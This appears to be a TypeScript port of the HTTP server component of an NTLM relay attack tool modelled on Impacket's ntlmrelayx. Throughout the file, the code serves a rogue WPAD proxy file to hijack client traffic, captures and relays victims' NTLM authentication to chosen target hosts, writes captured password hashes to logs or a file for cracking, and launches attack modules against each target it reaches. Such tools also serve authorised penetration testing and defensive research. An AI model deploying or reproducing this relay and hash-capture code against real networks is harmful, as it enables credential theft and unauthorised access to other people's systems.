import * as http from 'node:http';
import * as tls from 'node:tls';
import * as fs from 'node:fs';
import * as net from 'node:net';
import { info, error as logError, debug } from '@impacket/examples';
import * as ntlmMod from '@impacket/ntlm';
import { outputToJohnFormat, writeJohnOutputToFile } from '@impacket/smb-server';
import { STATUS_SUCCESS, STATUS_ACCESS_DENIED } from '@impacket/nt-errors';
import type { NTLMRelayxConfig, ProtocolClientInstance } from './config.js';
import { TargetsProcessor } from './targets.js';

const WPAD_TEMPLATE =
  'function FindProxyForURL(url, host){' +
  'if ((host == "localhost") || shExpMatch(host, "localhost.*") || (host == "127.0.0.1")) return "DIRECT"; ' +
  'if (dnsDomainIs(host, "%HOST%")) return "DIRECT"; ' +
  'return "PROXY %HOST%:80; DIRECT";}';

export class HTTPRelayServer {
  private config: NTLMRelayxConfig;
  private server: http.Server | null = null;
  private wpadCounters = new Map<string, number>();
  private connState = new Map<
    net.Socket,
    {
      target: URL | null;
      client: ProtocolClientInstance | null;
      challengeMessage: any;
      authUser: string | null;
      relayToHost: boolean;
    }
  >();

  constructor(config: NTLMRelayxConfig) {
    this.config = config;
  }

  start(): Promise<void> {
    const port = this.config.listeningPort ?? 80;
    const handler = (req: http.IncomingMessage, res: http.ServerResponse) =>
      this.handleRequest(req, res);

    if (this.config.https && this.config.certfile) {
      const options: tls.SecureContextOptions = {
        cert: fs.readFileSync(this.config.certfile),
        key: this.config.keyfile ? fs.readFileSync(this.config.keyfile) : undefined,
      };
      this.server = require('node:https').createServer(options, handler);
    } else {
      this.server = http.createServer(handler);
    }

    info(`Setting up HTTP Server on port ${port}`);
    return new Promise<void>((resolve, reject) => {
      this.server!.once('error', reject);
      this.server!.once('listening', () => {
        this.server!.removeListener('error', reject);
        resolve();
      });
      this.server!.listen(port, this.config.interfaceIp ?? '0.0.0.0');
    });
  }

  stop(): void {
    this.server?.close();
  }

  private getState(req: http.IncomingMessage) {
    const socket = req.socket;
    if (!this.connState.has(socket)) {
      this.connState.set(socket, {
        target: null,
        client: null,
        challengeMessage: null,
        authUser: null,
        relayToHost: false,
      });
      socket.once('close', () => this.connState.delete(socket));
    }
    return this.connState.get(socket)!;
  }

  private async handleRequest(req: http.IncomingMessage, res: http.ServerResponse): Promise<void> {
    try {
      // Consume request body
      const body = await new Promise<Buffer>((resolve) => {
        const chunks: Buffer[] = [];
        req.on('data', (c) => chunks.push(c));
        req.on('end', () => resolve(Buffer.concat(chunks)));
      });

      if (req.method === 'OPTIONS') {
        res.writeHead(200, {
          Allow: 'GET, HEAD, POST, PUT, DELETE, OPTIONS, PROPFIND',
          'Content-Length': '0',
          Connection: 'close',
        });
        res.end();
        return;
      }

      // Serve WPAD
      if (
        req.url?.toLowerCase() === '/wpad.dat' &&
        this.config.serve_wpad &&
        this.config.wpad_host
      ) {
        const clientIp = req.socket.remoteAddress ?? '';
        const count = this.wpadCounters.get(clientIp) ?? 0;
        this.wpadCounters.set(clientIp, count + 1);

        if (count >= this.config.wpad_auth_num) {
          info(`(HTTP): Serving PAC file to client ${clientIp}`);
          const wpad = WPAD_TEMPLATE.replace(/%HOST%/g, this.config.wpad_host);
          res.writeHead(200, {
            'Content-Type': 'application/x-ns-proxy-autoconfig',
            'Content-Length': Buffer.byteLength(wpad).toString(),
          });
          res.end(wpad);
          return;
        }
      }

      info(`(HTTP): Client requested path: ${req.url}`);

      const proxy = !!(req.url && req.url.length > 4 && req.url.slice(0, 4).toLowerCase() === 'http');
      const authHeader = proxy
        ? req.headers['proxy-authorization']
        : req.headers['authorization'];

      let token: Buffer | null = null;
      let messageType = 0;

      if (!authHeader) {
        this.sendAuthHead(res, proxy);
        return;
      }

      const headerStr = Array.isArray(authHeader) ? authHeader[0] : authHeader;
      if (!headerStr) {
        this.sendAuthHead(res, proxy);
        return;
      }

      const parts = headerStr.split('NTLM');
      if (parts.length < 2) {
        this.sendAuthHead(res, proxy);
        return;
      }

      token = Buffer.from(parts[1]!.trim(), 'base64');
      if (token.length < 12) {
        this.sendAuthHead(res, proxy);
        return;
      }
      messageType = token.readUInt32LE(8);

      const state = this.getState(req);

      if (!state.relayToHost && !this.config.disableMulti) {
        await this.doLocalAuth(req, res, messageType, token, proxy, state);
      } else {
        await this.doRelay(req, res, messageType, token, proxy, state);
      }
    } catch (e) {
      logError(`(HTTP): Exception in handler: ${e}`);
      try { res.end(); } catch { /* */ }
    }
  }

  private sendAuthHead(res: http.ServerResponse, proxy: boolean, msg = 'NTLM'): void {
    const statusCode = proxy ? 407 : 401;
    const header = proxy ? 'Proxy-Authenticate' : 'WWW-Authenticate';
    res.writeHead(statusCode, {
      [header]: msg,
      'Content-Type': 'text/html',
      'Content-Length': '0',
      Connection: 'keep-alive',
    });
    res.end();
  }

  private sendNotFound(res: http.ServerResponse): void {
    res.writeHead(404, {
      'WWW-Authenticate': 'NTLM',
      'Content-Type': 'text/html',
      'Content-Length': '0',
      Connection: 'close',
    });
    res.end();
  }

  private sendRedirect(res: http.ServerResponse, proxy: boolean): void {
    const rstr = Math.random().toString(36).slice(2, 12);
    const header = proxy ? 'Proxy-Authenticate' : 'WWW-Authenticate';
    res.writeHead(307, {
      [header]: 'NTLM',
      'Content-Type': 'text/html',
      Connection: 'keep-alive',
      Location: `/${rstr}`,
      'Content-Length': '0',
    });
    res.end();
  }

  private async doLocalAuth(
    req: http.IncomingMessage,
    res: http.ServerResponse,
    messageType: number,
    token: Buffer,
    proxy: boolean,
    state: ReturnType<HTTPRelayServer['getState']>,
  ): Promise<void> {
    if (messageType === 1) {
      // Generate a fake challenge to capture creds for target selection
      const challengeMessage = new ntlmMod.NTLMAuthChallenge();
      const challenge = Buffer.alloc(8);
      for (let i = 0; i < 8; i++) challenge[i] = Math.floor(Math.random() * 256);
      challengeMessage.set('flags',
        ntlmMod.NTLMSSP_NEGOTIATE_128 | ntlmMod.NTLMSSP_NEGOTIATE_56 |
        ntlmMod.NTLMSSP_NEGOTIATE_KEY_EXCH | ntlmMod.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY |
        ntlmMod.NTLMSSP_NEGOTIATE_NTLM | ntlmMod.NTLMSSP_NEGOTIATE_UNICODE | ntlmMod.NTLMSSP_REQUEST_TARGET);
      challengeMessage.set('challenge', challenge);
      challengeMessage.set('domain_name', Buffer.alloc(0));

      const b64 = challengeMessage.getData().toString('base64');
      this.sendAuthHead(res, proxy, `NTLM ${b64}`);
    } else if (messageType === 3) {
      const authenticateMessage = new ntlmMod.NTLMAuthChallengeResponse();
      authenticateMessage.fromString(token);
      state.authUser = authenticateMessage.getUserString?.() ?? 'unknown';

      state.target = this.config.target?.getTarget(state.authUser) ?? null;
      if (!state.target) {
        if (this.config.keepRelaying) {
          this.config.target?.reloadTargets(true);
          state.target = this.config.target?.getTarget(state.authUser) ?? null;
        }
        if (!state.target) {
          info(`(HTTP): Connection from ${state.authUser}@${req.socket.remoteAddress} controlled, but there are no more targets left!`);
          this.sendNotFound(res);
          return;
        }
      }

      info(`(HTTP): Connection from ${state.authUser}@${req.socket.remoteAddress} controlled, attacking target ${state.target.protocol}//${state.target.host}`);
      state.relayToHost = true;
      this.sendRedirect(res, proxy);
    }
  }

  private async doRelay(
    req: http.IncomingMessage,
    res: http.ServerResponse,
    messageType: number,
    token: Buffer,
    proxy: boolean,
    state: ReturnType<HTTPRelayServer['getState']>,
  ): Promise<void> {
    if (messageType === 1) {
      if (this.config.disableMulti) {
        state.target = this.config.target?.getTarget(null, false) ?? null;
        if (!state.target) {
          if (this.config.keepRelaying) {
            this.config.target?.reloadTargets(true);
            state.target = this.config.target?.getTarget(null, false) ?? null;
          }
          if (!state.target) {
            info(`(HTTP): Connection from ${req.socket.remoteAddress} controlled, but there are no more targets left!`);
            this.sendNotFound(res);
            return;
          }
        }
        info(`(HTTP): Connection from ${req.socket.remoteAddress} controlled, attacking target ${state.target.protocol}//${state.target.host}`);
      }

      if (!state.target) {
        this.sendNotFound(res);
        return;
      }

      const scheme = state.target.protocol.replace(':', '').toUpperCase();
      const ClientClass = this.config.protocolClients[scheme];
      if (!ClientClass) {
        logError(`(HTTP): Protocol Client for ${scheme} not found!`);
        this.sendNotFound(res);
        return;
      }

      const client = new ClientClass(this.config, state.target, { extendedSecurity: true });
      try {
        if (!(await client.initConnection())) {
          logError(`(HTTP): Connection to ${state.target.protocol}//${state.target.host} failed`);
          this.sendNotFound(res);
          return;
        }

        state.challengeMessage = await client.sendNegotiate(token);
        if (!state.challengeMessage) {
          logError('(HTTP): No challenge message from target');
          this.sendNotFound(res);
          return;
        }

        state.client = client;
      } catch (e) {
        logError(`(HTTP): Negotiate failed with ${state.target.protocol}//${state.target.host}: ${e}`);
        this.sendNotFound(res);
        return;
      }

      const b64 = state.challengeMessage.getData().toString('base64');
      this.sendAuthHead(res, proxy, `NTLM ${b64}`);
    } else if (messageType === 3) {
      if (!state.client || !state.target) {
        this.sendNotFound(res);
        return;
      }

      const authenticateMessage = new ntlmMod.NTLMAuthChallengeResponse();
      authenticateMessage.fromString(token);
      state.authUser = authenticateMessage.getUserString?.() ?? 'unknown';

      const userName = authenticateMessage.get('user_name') as Buffer;
      if (userName.length === 0 && state.target.hostname !== '127.0.0.1') {
        // Anonymous login
        this.sendAuthHead(res, proxy);
        return;
      }

      let errorCode: number;
      try {
        [, errorCode] = await state.client.sendAuth(token);
      } catch (e) {
        errorCode = STATUS_ACCESS_DENIED;
      }

      if (errorCode !== STATUS_SUCCESS) {
        logError(`(HTTP): Authenticating against ${state.target.protocol}//${state.target.host} as ${state.authUser} FAILED`);
        this.config.target?.registerTarget(state.target, false, state.authUser);
        this.sendNotFound(res);
        return;
      }

      state.client.setClientId();
      info(`(HTTP): Authenticating against ${state.target.protocol}//${state.target.host} as ${state.authUser} SUCCEED [${state.client.client_id}]`);

      const ntlmHashData = outputToJohnFormat(
        state.challengeMessage?.get?.('challenge') ?? Buffer.alloc(8),
        authenticateMessage.get('user_name') as Buffer,
        authenticateMessage.get('domain_name') as Buffer,
        authenticateMessage.get('lanman') as Buffer,
        authenticateMessage.get('ntlm') as Buffer,
      );
      state.client.sessionData['JOHN_OUTPUT'] = ntlmHashData;

      if (this.config.dumpHashes && ntlmHashData) {
        info(`(HTTP): ${ntlmHashData.hash_string}`);
      }
      if (this.config.outputFile && ntlmHashData) {
        writeJohnOutputToFile(ntlmHashData.hash_string, ntlmHashData.hash_version, this.config.outputFile);
      }

      if (!this.config.isADCSAttack) {
        this.config.target?.registerTarget(state.target, true, state.authUser);
      }

      // Run attack
      const scheme = state.target.protocol.replace(':', '').toUpperCase();
      const AttackClass = this.config.attacks[scheme];
      if (AttackClass) {
        const attack = new AttackClass(
          this.config,
          state.client.session,
          state.authUser ?? 'unknown',
          state.target,
          state.client,
        );
        attack.run().catch((e: any) => logError(`(HTTP): Attack failed: ${e}`));
      }

      if (this.config.disableMulti) {
        this.sendNotFound(res);
      } else {
        state.target = this.config.target?.getTarget(state.authUser) ?? null;
        if (!state.target) {
          this.sendNotFound(res);
        } else {
          info(`(HTTP): Connection from ${state.authUser}@${req.socket.remoteAddress} controlled, attacking target ${state.target.protocol}//${state.target.host}`);
          this.sendRedirect(res, proxy);
        }
      }
    }
  }
}
